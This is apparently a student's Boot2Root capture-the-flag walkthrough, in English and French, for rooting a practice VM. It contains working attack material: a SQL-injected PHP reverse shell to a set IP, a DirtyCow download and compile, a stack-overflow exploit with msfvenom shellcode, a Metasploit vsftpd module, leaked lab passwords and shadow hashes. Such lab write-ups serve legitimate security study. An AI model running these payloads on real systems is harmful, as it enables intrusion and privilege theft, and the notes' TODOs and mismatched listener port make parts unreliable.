# Boot2Root

# Setup

Create a new VM from the ISO

Connect this VM as bridge adapter to be on same network as your host:


Find target's address:
    nmap -sn -PE -v IP_HOST/24

# Enumeration

## Port listing
List ports on the target with nmap

    nmap -sA -O -sV -vv -oN nmap.dump IP_TARGET

# Website
## Detect files and directories with gobuster

### Install gobuster

    brew install gobuster

TODO find an installation way that works at school

### Run
    gobuster dir -u http://IP_TARGET/ -w WORDLIST_PATH

find /forum
on https

## Detect files and directories with nikto

Download/install Nikto
    
    brew install nikto

## On the forum

This forum is powered by `My little forum`

We find several posts and one of them is very interesting:
 a dump of the target's connections log .
 See this >>> file <<<
TODO make a script that download the file and make a link here


users in log:
lmezard
root
admin

users in forum:
admin
lmezard
qudevide
wandre
thor
zaz



On the tab `login` we can try to connect as `lmezard` with the password `!q\]Ej?*5K5cy*AJ`.

Success !!


we find her email: `laurie@borstosec.net`

Nmap is finaly over.
Now we can detect several things
21 FTP VSFTPS 2.0.8
22 SSH OPENSSH 5.9p1
80 HTTP Apache 2.2.22
143: IMAP Dovecot imapd
    email dumped: root@born2sec.net
443 HTTP Apache 2.2.22
993 SSL/IMAP Dovecot imapd

We run the script Nikto and find:

/webmail/src/index.php

Version: `1.4.22`

we connect with 
    laurie@born2sec.net
    !q\]Ej?*5K5cy*AJ
Now we found other interesting things:
Some email including root's:
- qudevide@mail.borntosec.net
- ft_root@mail.borntosec.net

Some DB credentials:
user: root 
password: Fg-'kKXBj87E:aJ$

On the **official** website of `squirelMail` we can find that version bellow or equal to `1.4.22` are vulnerable at `arbitrary code execution` referenced as `CVE-2017-7692`.

With some research on this CVE we can easely find an exploit and test it.

On the phpmyadmin page
get a php webshell

Version: `3.4.10.1deb1`

...

Now we need to read this file.
For this purpose we need to look at a vulnerability called `locale file injection`.

We found nothing really interesting.

Sur le Readme de My little forum https://github.com/ilosuna/mylittleforum on peut lire que les permissions du repertoire `templates_c`.

Upload the shell and goto /forum/templates_c/exploit.php?e=cat /etc/passwd

reverse shell:
    SELECT "<?php $sock=fsockopen(\"192.168.43.161\",8090);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>" into outfile "/var/www/forum/templates_c/nat4.php";

Set your listener:
    nc -lvnk 8081
Go to https://TARGET_IP/forum/templates_c/nat4.php
You should now have received a connection from the target.



The dirty way:

The linux core under linux 3.9 are all vulnerable to the `dirtyCow` vulnerability.

Download an exploit of the `dirtyCow` vulnerability:
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c

Edit in the code the variable `username` to the user you want to reset his password.

compile it with:
    gcc -pthread dirty.c -o out -lcrypt

run it, give the new password wait a little and look at `/etc/passwd`.
You should find something like:
root:roK20XGbWEsSM

Run:
    sudo -c /bin/bash

Rentrez votre nouveau mot de passe.

TADAAM you are root now !!

Une fois root

Upgrade your shell:

Run:
- `python -c 'import pty; pty.spawn("/bin/bash")'`.

That's enought to run some command like su or sudo but if you want an even better shell add thoose commands:
- `export TERM=xterm` -- this will give us access to term commands such as clear.
- `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`.

dans /home/LOOKATME/password on trouve:
    lmezard:G!@M6f4Eatau{sF"

Connect as lmezard with TODO wrong should not be root
    su lmezard

Connect as lmezard via FTP:
You could use Filezilla.


Here we have a challenge. An executable that can gives us the next password

Letters for the password. 
aIwangeetprh

    echo -n "Iheartpwnage" | shasum -a 256 | cut -d ' ' -f 1
password = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

ssh laurie@TARGET_IP 

Now we are Laurie
New challenge: diffuse the bomb

    objdump -D -s -S -t --line-numbers -M intel bomb
    readelf -x .rodata ./bomb

Public speaking is very easy.
1 2 6 24 120 720
7 b 524
9 
opekmq
4 2 6 3 1 5

password pour thor:
Publicspeakingisveryeasy.126241207207b5249opekmq426315
Publicspeakingisveryeasy.126241207201b2149opekmq426135

turtle challenge

goto https://trinket.io/challenges/bullseye.html

SLASH
echo -n SLASH | md5sum

646da671ca01bb5d84dbb5fb2238dc8e

# Logged as zaz

1 SUID file

functions:
- strcpy
- puts

2 fonctions de la libC

print it's first argument

ld.so.preload is a wrong way, let's look at strcpy

objdump => return addr

Set argument like this:
(gdb) set args "AAAAAAAAAAAAAAA"

gdb break on return addr | break *OxADDR


display top stack with:
x/64wx $esp

0x41 = A on voit bien notre input de AAAAAAA
```
0xbffff610:	0xbffff620	0xbffff889	0x00000001	0xb7ec3c49
0xbffff620:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff630:	0xbf004141	0xb7fdd000	0x00000000	0xb7e5ec73
0xbffff640:	0x08048241	0x00000000	0x00ca0000	0x00000001
0xbffff650:	0xbffff874	0x0000002f	0xbffff6ac	0xb7fd0ff4
0xbffff660:	0x08048440	0x080496e8	0x00000002	0x080482dd
0xbffff670:	0xb7fd13e4	0x0000000d	0x080496e8	0x08048461
0xbffff680:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff690:	0xb7fed280	0x00000000	0x08048449	0xb7fd0ff4
0xbffff6a0:	0x08048440	0x00000000	0x00000000	0xb7e454d3
0xbffff6b0:	0x00000002	0xbffff744	0xbffff750	0xb7fdc858
0xbffff6c0:	0x00000000	0xbffff71c	0xbffff750	0x00000000
0xbffff6d0:	0x0804820c	0xb7fd0ff4	0x00000000	0x00000000
0xbffff6e0:	0x00000000	0x9e06e153	0xa942a543	0x00000000
0xbffff6f0:	0x00000000	0x00000000	0x00000002	0x08048340
0xbffff700:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
```

addr start = 0xbffff620

Use `info frame`
```
Stack level 0, frame at 0xbffff6b0:
 eip = 0x8048436 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff6a8, args:
 Locals at 0xbffff6a8, Previous frame's sp is 0xbffff6b0
 Saved registers:
  ebp at 0xbffff6a8, eip at 0xbffff6ac
```
eip is saved at 0xbffff6ac and this value  equal 0xb7e454d3.
If we can overwrite this address we can jump to our own code

calculate the difference between addresses in gcc:
p/d  0xbffff6ac - 0xbffff620

The difference is an offset of 140.

Set args like this
    (gdb) set args "$(python -c 'print "A" * 140')$(printf "\x20\xf6\xff\xbf")"

(nop = 0x90)
restart the program and you should have a sigkill by illegal instruction.
Your redirection works well !!

## make a payload with msfvenom

Use msfvenom --list payloads
select your payload
use msfvenom -p payload --list-options
 
msfvenom -p linux/x86/exec -n 140 --pad-nops -f raw -o payload.txt PrependSetuid=true VERBOSE=true NullFreeVersion=true

msfvenom -p linux/x86/exec -n 32 -f raw -o payload.txt PrependSetuid=true PrependSetresuid=true VERBOSE=true NullFreeVersion=true

msfvenom -p linux/x86/exec -n 32 -f raw -o payload.txt PrependSetuid=true PrependSetresuid=true VERBOSE=true NullFreeVersion=true CMD="/bin/bash -p"

https://0xrick.github.io/binary-exploitation/bof5/
# Pour plus tard

Checker le serveur VSFTPD


0xbffff590:	0xbffff5a0	0xbffff80d	0x00000001	0xb7ec3c49
0xbffff5a0:	0x04769091	0x2573a99b	0x4beb2914	0x1b7c2c7d
0xbffff5b0:	0xe30a7fd4	0x2f759824	0xa8f9187a	0x4ae21278
0xbffff5c0:	0x74fd2072	0x1579b11c	0x85bb3f70	0xe0327bd5
0xbffff5d0:	0xb83f7e42	0xb990998d	0x1477f54a	0x76b627bb
0xbffff5e0:	0x9366a82c	0x8337b01c	0x734105fd	0x49436725
0xbffff5f0:	0xe19b34a9	0x1d4b4015	0xb32f3524	0x3dba0db1
0xbffff600:	0xb2b5fc92	0x98d59f2d	0xf848d469	0x2ad60871
0xbffff610:	0xb4040cf9	0x3191b73c	0xb0e1f7c9	0x732f680b
0xbffff620:	0x622f6868	0xe3896e69	0xf62080cd	0xb700bfff
0xbffff630:	0x00000002	0xbffff6c4	0xbffff6d0	0xb7fdc858
0xbffff640:	0x00000000	0xbffff61c	0xbffff6d0	0x00000000
0xbffff650:	0x0804820c	0xb7fd0ff4	0x00000000	0x00000000
0xbffff660:	0x00000000	0xb97136ca	0x8e3472da	0x00000000
0xbffff670:	0x00000000	0x00000000	0x00000002	0x08048340
0xbffff680:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4

(gdb) set args "$(python -c 'print "A" * 140')$(printf "\xf0\xf5\xff\xbf")$(cat payload.txt)"

Run:
./exploit_me "$(python -c 'print "A" * 140')$(printf "\x90\xf5\xff\xbf")$(python -c 'print "\x90" * 64')$(cat payload.txt)"

And now we are Root !!!!!

# VSFTPD EXPLOIT

start metasploit `msfconsole`

search vsftpd

use 0

show options

set RHOST 192.168.43.82

# Other writeup

shift key at startup to get prompted by the GRUB

live init=/bin/bash


# /etc/shadow

root:$6$P3HXAOsR$Lmz85I7RXUJLU8KR.C2okbToyNfq5QIDj6YOoWYilDWQ3e.dhXC/bamN4xLcAZVHHLFuszMaGD6nRa5HrFAls0:16723:0:99999:7:::
ft_root:$6$lOBKtnYu$GBZ.hMzEtOsj02ngxGvMKZzFFBy2DEzil11s0G6a5eDUyEo88t1VZfdVqlfUc/jUG9748avR0.FhT4rJmPqmI1:16723:0:99999:7:::

# NFS
https://elinux.org/Squash_FS_Howto#Creating_and_using_squashed_file_systems

scp zaz@192.168.1.241:/cdrom/casper/filesystem.squashfs .

mkdir /mnt/dir 

mount filesystem.squashfs /mnt/dir -t squashfs -o loop 

cd /mnt/dir

cat ./root/.bash_history | grep -C 4 adduser
